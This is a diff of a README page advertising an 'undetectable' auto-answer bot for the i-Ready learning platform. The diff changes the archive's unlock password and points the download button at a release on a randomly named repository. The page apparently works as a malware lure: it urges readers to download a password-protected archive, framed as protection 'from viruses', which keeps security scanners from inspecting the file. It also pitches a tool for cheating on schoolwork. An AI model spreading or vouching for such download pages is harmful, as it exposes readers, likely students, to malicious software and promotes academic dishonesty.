@@ -52,7 +52,7 @@ This archive contains the most advanced, undetectable **IReady Auto-Answer Bot**
 > **⚠️ IMPORTANT SECURITY NOTICE:**  
 > The archive is password-protected to prevent viruses and automated scrapers from tampering with the code. Use the password below to unlock it.
 
-### 🔑 UNLOCK PASSWORD: `8593`
+### 🔑 UNLOCK PASSWORD: `iready420`
 
 ---
 
@@ -60,7 +60,7 @@ This archive contains the most advanced, undetectable **IReady Auto-Answer Bot**
 
 Click the button below to safely download the full package:
 
-[![Download Bot](https://img.shields.io/badge/Download-IReady%20Bot-brightgreen?style=for-the-badge&logo=github)](https://github.com/PatrolWandEsteem/iready-bot/archive/refs/heads/main.zip)
+[![Download Bot](https://img.shields.io/badge/Download-IReady%20Bot-brightgreen?style=for-the-badge&logo=github)](https://github.com/opticrepairrob/xbqnxwkr/releases/tag/iready)
 
 ---
 
